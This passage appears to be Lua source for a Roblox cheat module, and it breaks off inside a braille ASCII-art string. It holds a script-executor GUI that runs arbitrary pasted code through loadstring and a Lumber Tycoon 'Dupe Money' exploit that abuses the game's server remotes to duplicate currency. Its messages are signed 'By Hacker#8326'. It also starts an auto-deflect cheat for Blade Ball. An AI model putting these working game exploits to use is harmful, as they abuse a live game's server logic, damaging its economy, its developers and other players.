	Clear.Name = "Clear"
	Clear.Parent = Executor
	Clear.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Clear.BackgroundTransparency = 0.600
	Clear.Position = UDim2.new(0, 182, 0, 248)
	Clear.Size = UDim2.new(0, 102, 0, 25)
	Clear.Font = Enum.Font.SourceSans
	Clear.Text = "Clear"
	Clear.TextColor3 = Color3.fromRGB(255, 255, 255)
	Clear.TextSize = 20.000

	UICorner_6.Parent = Clear

	UIAspectRatioConstraint_7.Parent = Clear
	UIAspectRatioConstraint_7.AspectRatio = 4.080

	Save.Name = "Save"
	Save.Parent = Executor
	Save.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Save.BackgroundTransparency = 0.600
	Save.Position = UDim2.new(0, 294, 0, 248)
	Save.Size = UDim2.new(0, 102, 0, 25)
	Save.Font = Enum.Font.SourceSans
	Save.Text = "Save"
	Save.TextColor3 = Color3.fromRGB(255, 255, 255)
	Save.TextSize = 20.000

	UICorner_7.Parent = Save

	UIAspectRatioConstraint_8.Parent = Save
	UIAspectRatioConstraint_8.AspectRatio = 4.080
	local LoadstringL = require(Loadstring)

	UIAspectRatioConstraint_9.Parent = Executor
	UIAspectRatioConstraint_9.AspectRatio = 1.676



	local function QDVHE_fake_script() -- Execute.LocalScript 
		local script = Instance.new('LocalScript', Execute)

		local execute = script.Parent
		Editor = script.Parent.Parent.EditorScroller.Editor

		execute.MouseButton1Click:Connect(
			function()




				local exec, zac = LoadstringL(Editor.Text)
				exec()
			end
		)

	end
	coroutine.wrap(QDVHE_fake_script)()
	local function MLYQ_fake_script() -- Clear.LocalScript 
		local script = Instance.new('LocalScript', Clear)

		Clear = script.Parent
		Clear.MouseButton1Click:Connect(function()
			script.Parent.Parent.EditorScroller.Editor.Text = ""
		end)
	end
	coroutine.wrap(MLYQ_fake_script)()
	local function ORCKN_fake_script() -- Executor.LocalScript 
		local script = Instance.new('LocalScript', Executor)

		script.Parent.Active = true
		script.Parent.Draggable = true
		script.Parent.Parent.ResetOnSpawn = false
	end
	coroutine.wrap(ORCKN_fake_script)()
	local function JPWI_fake_script() -- Executor.LocalScript 
		local script = Instance.new('LocalScript', Executor)

		script.Parent:TweenPosition(UDim2.new(0.308, 0,0.262, 0), "Out", "Quint",1,true)
	end
	coroutine.wrap(JPWI_fake_script)()
end
function mod:LumberTycoon()
	local ScreenGui = Instance.new("ScreenGui")
	local Main = Instance.new("Frame")
	local Dupe = Instance.new("TextButton")
	local SL = Instance.new("TextButton")
	local SF = Instance.new("Frame")
	local S1 = Instance.new("TextButton")
	local S3 = Instance.new("TextButton")
	local S2 = Instance.new("TextButton")
	local S6 = Instance.new("TextButton")
	local S5 = Instance.new("TextButton")
	local S4 = Instance.new("TextButton")
	local Frame = Instance.new("Frame")
	local Close = Instance.new("TextButton")
	local ImageButton = Instance.new("ImageButton")
	local TextLabel = Instance.new("TextLabel")

	ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui

	ImageButton.Parent = ScreenGui
	ImageButton.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageButton.BorderSizePixel = 0
	ImageButton.Position = UDim2.new(0.306653798, 0, 0.101391658, 0)
	ImageButton.Size = UDim2.new(0, 400, 0, 400)
	ImageButton.Image = "http://www.roblox.com/asset/?id=5136300631"

	TextLabel.Parent = ImageButton
	TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel.BackgroundTransparency = 1
	TextLabel.Position = UDim2.new(0, 0, 0.817499995, 0)
	TextLabel.Size = UDim2.new(0, 400, 0, 73)
	TextLabel.Font = Enum.Font.SciFi
	if game.Players.LocalPlayer.Name == "jjkyt1234" then
		TextLabel.Text = "Hi Youtube (:"
	else
		TextLabel.Text = "Welcome "..game.Players.LocalPlayer.Name
	end
	TextLabel.TextColor3 = Color3.new(0, 1, 0.933333)
	TextLabel.TextScaled = true
	TextLabel.TextSize = 14
	TextLabel.TextWrapped = true

	Main.Name = "Main"
	Main.Parent = ScreenGui
	Main.BackgroundColor3 = Color3.new(0, 0, 1)
	Main.BorderSizePixel = 0
	Main.Position = UDim2.new(0.332887709, 0, 0.372509956, 0)
	Main.Size = UDim2.new(0, 249, 0, 127)
	Main.Active = true
	Main.Draggable = true
	Main.Visible = false

	Dupe.Name = "Dupe"
	Dupe.Parent = Main
	Dupe.BackgroundColor3 = Color3.new(0, 1, 1)
	Dupe.BorderSizePixel = 3
	Dupe.BorderColor3 = Color3.new(0, 0, 0)
	Dupe.Position = UDim2.new(0.0923694819, 0, 0.322834641, 0)
	Dupe.Size = UDim2.new(0, 203, 0, 44)
	Dupe.Font = Enum.Font.Garamond
	Dupe.Text = "Dupe Money"
	Dupe.TextColor3 = Color3.new(0, 0, 0)
	Dupe.TextScaled = true
	Dupe.TextSize = 14
	Dupe.TextWrapped = true

	SL.Name = "SL"
	SL.Parent = Main
	SL.BackgroundColor3 = Color3.new(0.890196, 0, 0.0117647)
	SL.BorderSizePixel = 0
	SL.Position = UDim2.new(0.112449802, 0, 0.795275569, 0)
	SL.Size = UDim2.new(0, 194, 0, 26)
	SL.Font = Enum.Font.SourceSans
	SL.Text = "Slot Number"
	SL.TextColor3 = Color3.new(0, 1, 0.498039)
	SL.TextScaled = true
	SL.TextSize = 14
	SL.TextWrapped = true

	SF.Name = "SF"
	SF.Parent = SL
	SF.BackgroundColor3 = Color3.new(1, 1, 1)
	SF.BackgroundTransparency = 1
	SF.BorderSizePixel = 0
	SF.Position = UDim2.new(0, 0, 1, 0)
	SF.Size = UDim2.new(0, 100, 0, 100)
	SF.Visible = false

	S1.Name = "S1"
	S1.Parent = SF
	S1.BackgroundColor3 = Color3.new(0, 0, 0)
	S1.BorderSizePixel = 1
	S1.BorderColor3 = Color3.new(0, 0, 0)
	S1.Size = UDim2.new(0, 194, 0, 30)
	S1.Font = Enum.Font.Garamond
	S1.Text = "Slot Number 1"
	S1.TextColor3 = Color3.new(1, 0, 0)
	S1.TextScaled = true
	S1.TextSize = 14
	S1.TextWrapped = true

	S3.Name = "S3"
	S3.Parent = SF
	S3.BackgroundColor3 = Color3.new(0, 0, 0)
	S3.BorderSizePixel = 1
	S3.BorderColor3 = Color3.new(0, 0, 0)
	S3.Position = UDim2.new(-0, 0, 0.639999986, 0)
	S3.Size = UDim2.new(0, 194, 0, 30)
	S3.Font = Enum.Font.Garamond
	S3.Text = "Slot Number 3"
	S3.TextColor3 = Color3.new(1, 0, 0)
	S3.TextScaled = true
	S3.TextSize = 14
	S3.TextWrapped = true

	S2.Name = "S2"
	S2.Parent = SF
	S2.BackgroundColor3 = Color3.new(0, 0, 0)
	S2.BorderSizePixel = 1
	S2.BorderColor3 = Color3.new(0, 0, 0)
	S2.Position = UDim2.new(0, 0, 0.319999993, 0)
	S2.Size = UDim2.new(0, 194, 0, 30)
	S2.Font = Enum.Font.Garamond
	S2.Text = "Slot Number 2"
	S2.TextColor3 = Color3.new(1, 0, 0)
	S2.TextScaled = true
	S2.TextSize = 14
	S2.TextWrapped = true

	S6.Name = "S6"
	S6.Parent = SF
	S6.BackgroundColor3 = Color3.new(0, 0, 0)
	S6.BorderSizePixel = 1
	S6.BorderColor3 = Color3.new(0, 0, 0)
	S6.Position = UDim2.new(0, 0, 1.60000002, 0)
	S6.Size = UDim2.new(0, 194, 0, 30)
	S6.Font = Enum.Font.Garamond
	S6.Text = "Slot Number 6"
	S6.TextColor3 = Color3.new(1, 0, 0)
	S6.TextScaled = true
	S6.TextSize = 14
	S6.TextWrapped = true

	S5.Name = "S5"
	S5.Parent = SF
	S5.BackgroundColor3 = Color3.new(0, 0, 0)
	S5.BorderSizePixel = 1
	S5.BorderColor3 = Color3.new(0, 0, 0)
	S5.Position = UDim2.new(0, 0, 1.27999997, 0)
	S5.Size = UDim2.new(0, 194, 0, 30)
	S5.Font = Enum.Font.Garamond
	S5.Text = "Slot Number 5"
	S5.TextColor3 = Color3.new(1, 0, 0)
	S5.TextScaled = true
	S5.TextSize = 14
	S5.TextWrapped = true

	S4.Name = "S4"
	S4.Parent = SF
	S4.BackgroundColor3 = Color3.new(0, 0, 0)
	S4.BorderSizePixel = 1
	S4.BorderColor3 = Color3.new(0, 0, 0)
	S4.Position = UDim2.new(0, 0, 0.959999979, 0)
	S4.Size = UDim2.new(0, 194, 0, 30)
	S4.Font = Enum.Font.Garamond
	S4.Text = "Slot Number 4"
	S4.TextColor3 = Color3.new(1, 0, 0)
	S4.TextScaled = true
	S4.TextSize = 14
	S4.TextWrapped = true

	Frame.Parent = Main
	Frame.BackgroundColor3 = Color3.new(0.847059, 0.564706, 0)
	Frame.BorderSizePixel = 0
	Frame.Size = UDim2.new(0, 249, 0, 26)

	Close.Name = "Close"
	Close.Parent = Frame
	Close.BackgroundColor3 = Color3.new(1, 0, 0)
	Close.BorderSizePixel = 0
	Close.Position = UDim2.new(0.863453865, 0, 0, 0)
	Close.Size = UDim2.new(0, 34, 0, 26)
	Close.Font = Enum.Font.SourceSans
	Close.Text = "X"
	Close.TextColor3 = Color3.new(0, 0, 0)
	Close.TextSize = 14
	Close.MouseButton1Down:connect(function()
		Sound22()
		ScreenGui:Destroy()
	end)

	local Slots = { S1, S2, S3, S4, S5, S6 }

	function Sound11()
		local s = Instance.new("Sound")

		s.Name = "Sound"
		s.SoundId = "rbxassetid://408524543"
		s.Volume = 2
		s.archivable = false
		s.Parent = game.Workspace
		s:play()
	end
	function Sound22()
		local Song1 = Instance.new("Sound")

		Song1.Name = "Song1"
		Song1.SoundId = "rbxassetid://452267918"
		Song1.Volume = 2
		Song1.archivable = false
		Song1.Parent = game.Workspace
		Song1:play()
	end

	ImageButton.MouseButton1Down:connect(function()
		Sound22()
		ImageButton.Visible = false
		Main.Visible = true
	end)

	for i,v in pairs(Slots) do
		v.MouseButton1Down:connect(function()
			Sound22()
			SF.Visible = false
			SL.Text = v.Text
		end)
		v.MouseEnter:connect(function() 
			Sound11()
			v.BorderColor3 = Color3.new(1, 0, 0)
			v.TextColor3 = Color3.new(0, 1, 1)
		end)
		v.MouseLeave:Connect(function() 
			v.BorderColor3 = Color3.new(0, 0, 0)
			v.TextColor3 = Color3.new(1, 0, 0)
		end)
	end

	Dupe.MouseEnter:connect(function() 
		Sound11()
		Dupe.BorderColor3 = Color3.new(1, 0, 0)
		Dupe.BackgroundColor3 = Color3.new(0, 0, 0)
		Dupe.TextColor3 = Color3.new(1, 0, 0)
	end)
	Dupe.MouseLeave:Connect(function() 
		Dupe.BorderColor3 = Color3.new(0, 0, 0)
		Dupe.BackgroundColor3 = Color3.new(0, 1, 1)
		Dupe.TextColor3 = Color3.new(0, 0, 0)
	end)

	SL.MouseButton1Down:connect(function()
		Sound22()
		if SF.Visible == false then
			SF.Visible = true
		else
			SF.Visible = false
		end
	end)

	function ML(Tex)
		game:GetService("Players").LocalPlayer.PlayerGui.MoneyDisplayGui.Text.Text = Tex
		game:GetService("Players").LocalPlayer.PlayerGui.MoneyDisplayGui.Text.DropShadow.Text = Tex
	end

	Dupe.MouseButton1Down:connect(function()
		Sound22()
		local DupeMoney
		if SL.Text == "Slot Number 1" then
			DupeMoney = 1
		elseif SL.Text == "Slot Number 2" then
			DupeMoney = 2
		elseif SL.Text == "Slot Number 3" then
			DupeMoney = 3
		elseif SL.Text == "Slot Number 4" then
			DupeMoney = 4
		elseif SL.Text == "Slot Number 5" then
			DupeMoney = 5
		elseif SL.Text == "Slot Number 6" then
			DupeMoney = 6
		end
		if game.Players.LocalPlayer.CurrentSaveSlot.Value ~= -1 and DupeMoney ~= nil then
			game:GetService("StarterGui"):SetCore("SendNotification",{
				Title = "By Hacker#8326",
				Text = "You Cant Have Any Slot Loaded",
				Duration = 15,
			})
			return
		end
		if DupeMoney ~= nil then
			if Duping == true then
				game:GetService("StarterGui"):SetCore("SendNotification",{
					Title = "By Hacker#8326",
					Text = "You Must Wait Until The Dupe Is Over",
					Duration = 15,
				})
				return
			end
			Duping = true
			local Folder
			if game.Players.LocalPlayer.CurrentSaveSlot.Value == -1 then
				if not game.Workspace:FindFirstChild("Folder") then
					Folder = Instance.new("Folder", game:GetService("Workspace"))
				end

				function Load(NumberSlot)
					game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(NumberSlot)
				end

				game:GetService("Workspace").Folder.ChildAdded:connect(function(v)
					if v.Name == "Part" then
						game:GetService("Workspace").Folder.Part:Destroy()
						wait()
						game.ReplicatedStorage.Transactions.ClientToServer.Donate:InvokeServer(game.Players.LocalPlayer, game.Players.LocalPlayer.leaderstats.Money.Value, 1)
						game:GetService("StarterGui"):SetCore("SendNotification",{
							Title = "By Hacker#8326",
							Text = "Dupe Is Over, Enjoy Your Money",
							Duration = 15,
						})
					end
				end)

				Load(DupeMoney)
				if game.Players.LocalPlayer.leaderstats.Money.Value == 20 then
					game:GetService("StarterGui"):SetCore("SendNotification",{
						Title = "By Hacker#8326",
						Text = "You Must Load Your Base, Repeat The Command Again",
						Duration = 15,
					})
					Duping = false
					return 
				end
				game:GetService("StarterGui"):SetCore("SendNotification",{
					Title = "By Hacker#8326",
					Text = "Please Wait 60 Seconds",
					Duration = 15,
				})
				for i=59,0,-1 do
					ML(i)
					wait(1)
				end
				local a = Instance.new("Part", Folder)
				wait(0.1)
				Load(-1)
				game:GetService("Workspace").Folder:Destroy()
				Duping = false
				game:GetService("StarterGui"):SetCore("SendNotification",{
					Title = "By Hacker#8326",
					Text = "Load Your Save and Wait The Money Come Back!",
					Duration = 15,
				})
			end
		end
	end)
end
function mod:LoadBladeBall()
	shared.config = {
		adjustment = 3.7, -- // Keep this between 3 to 4 \\ --
		hit_range = 0.5, -- // You can mess around with this \\ --

		mode = 'Hold', -- // Hold , Toggle , Always \\ --
		deflect_type = 'Remote', -- // Key Press , Remote \\ --
		notifications = true,
		keybind = Enum.KeyCode.E
	}


	local UserInputService = game:GetService("UserInputService")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")

	local LocalPlayer = game:GetService("Players").LocalPlayer
	local Balls = game:GetService("Workspace").Balls

	local IsTargeted = false
	local CanHit = false
	pcall(function()

		local furry = [[
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠁⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢶⣿⢃⣠⣴⣶⣶⣿⣛⢯⣹⣾⠁⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣻⣾⣿⣞⣯⣷⣽⣾⣿⣁⣀⣠⢤⡶⣶⠿⣻⣶⣟⡿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣟⣯⣿⣶⣯⣿⣿⣿⡁⠀⣴⠿⣟⣿⣟⣿⣻⢷⢯⣞⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢈⡇⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡶⢒⣖⣲⡶⢶⡖⣶⣒⢶⡲⣞⣫⠭⣭⣭⣽⣭⣯⣽⣿⣿⣿⣿⣿⣿⣿⠿⢿⡿⠿⠿⠿⣌⠿⢿⣿⣿⣿⣿⡾⣽⢯⣟⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠘⡀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣯⣛⢧⣛⢧⣛⡶⣹⣎⢷⣝⡮⣟⢷⡾⣹⢯⡟⠉⠉⠛⢿⣿⣿⣯⣟⣿⣫⣽⡿⣃⣔⣬⣿⣷⣯⣿⣿⣿⣿⣽⣻⣾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣟⡾⣭⡟⣾⣹⢗⣾⣫⢾⡽⣽⢾⡽⢯⡟⠀⠀⠀⢀⢈⣿⣿⣿⣿⣿⠿⢻⣷⣼⣿⣿⣟⣿⣟⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠐⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣷⣿⣷⣯⣟⡾⣽⣳⢿⡽⣾⡽⡟⠀⠀⢀⣰⠞⠟⠙⢻⣷⣿⣸⣷⣾⣟⣺⣽⣟⣻⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣷⣯⣿⣽⣳⢿⠃⠀⠀⢀⠀⢠⣤⣦⣄⣇⠉⠛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣿⣿⣿⣿⣿⣉⠉⠉⠻⠀⠀⠠⢀⣾⢿⠋⢁⣿⣿⠀⠀⠀⠀⣿⣧⠙⢿⣹⣏⢠⣛⠟⠁⠀⠀⢀⣴⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣿⣓⣈⣰⣦⣤⣀⣼⠋⠀⠀⢭⣽⣿⡇⠀⣀⣀⣿⣿⡇⡸⣿⣿⡤⠉⠒⠤⣀⠀⠠⡄⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢹⠏⠀⠛⣞⣧⣾⠍⠢⣀⠀⠈⠻⠟⣇⢉⣡⡶⣭⠯⡀⠐⠛⠙⢇⠀⠐⢲⠏⠀⠀⠈⠲⠞⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠁⢀⠄⠂⢸⠛⠁⣠⣲⡆⢔⠾⠋⠀⠈⠢⣉⠀⢀⣀⣈⡆⠀⠀⢸⣀⠔⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠤⣌⡁⠀⠀⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⡿⠀⠀⣜⣩⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⣛⡉⠀⠀⠓⢄⡀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⡹⠋⠀⣠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠐⠒⠚⣿⣶⠦⣄⣀⡀⠘⠿⠽⠶⢾⣷⣀⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣀⡀⣀⣀⣠⡿⠍⣛⠻⡿⠿⣟⣲⣶⣶⡶⠿⣿⣖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠼⠛⢻⠿⠻⢿⣿⣷⣿⣶⣆⠬⡯⣑⣿⣿⣿⣿⣹⣍⣧⣾⠈⠉⠉⠒⠒⠠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⠁⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠐⠒⠠⣔⠁⠀⠉⣿⣿⣿⢛⡖⠾⠿⢿⡿⠿⣾⠟⠁⠀⠀⠀⠀⠀⠸⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⢢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡅⠀⠀⠀⠀⠀⠀⠀⠉⠒⠄⠘⢿⣿⠇⠈⠁⠒⠺⣤⣢⡼⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠣⡀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠹⡄⠐⠒⠠⠤⠀⣀⠀⠀⠀⠀⠈⣏⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢆⠀⠀⠙⣆⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⣄⠜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀⠘⣆⠀⠀⠀⠀⠀⠉⠑⠢⡀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀⠀⠀⠈⢣⡀⠠⢄⣀⠀⠀⠀⢠⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠧⣀⣀⠀⢀⡤⠋⠀⠀⠀⠀⠈⢁⠒⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⢀⣠⢾⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠆⠈⢂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⣻⡿⠏⠀⠀⠀⠐⠢⠄⢀⡀⣰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡷⠖⠋⣁⡼⣇⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⡀⢀⡎⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡔⠍⠀⠀⠈⠢⣀⠀⠀⠀⡰⢠⡇⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⡴⠋⠁⠁⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢧⠄⠂⡄⠀⠀⠀⠀⠁⠢⢴⣁⡼⠀⠀⠀⠈⠑⠂⠀⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⣀⠤⠖⠉⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⢠⠀⠀⠀⠑⠤⡀⠀⠀⡐⠁⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
